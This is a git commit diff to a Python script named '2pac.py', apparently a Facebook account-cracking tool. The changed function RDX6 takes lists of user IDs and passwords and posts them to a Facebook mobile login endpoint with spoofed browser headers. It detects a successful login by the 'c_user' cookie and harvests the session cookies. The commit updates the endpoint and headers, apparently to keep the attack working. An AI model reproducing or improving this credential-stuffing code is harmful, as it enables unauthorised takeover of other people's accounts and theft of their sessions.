088d1ca8998c365baf661265d4b943adae2ef570
LegendxSidhu <131896738+LegendxSidhu@users.noreply.github.com>
2023-04-27 09:07:17 +0500

    Update 2pac.py

--- 2pac.py
+++ 2pac.py
@@ -1549,22 +1549,26 @@ def RDX6(ids,passlist):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-		header_freefb =  {'authority': 'mbasic.facebook.com',
-                    'method': 'path',
-		    'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-				 lo = session.post('https://mbasic.facebook.com/',cookies=cookies, headers=headers).text
+                        header_freefb = {'authority':'p.facebook.com',
+			'upgrade-insecure-requests': '1',
+			'viewport-width': '980',
+			'method': 'path',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
+			'dnt':'1', 
+			'x-requested-with':'mark.via.gp', 
+			'sec-fetch-site': 'none',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-user': '?1',
+			'sec-fetch-dest': 'document',
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+			'cache-control': 'max-age=0',
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+			"sec-ch-prefers-color-scheme": "light",
+			'user-agent': ua}
+			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
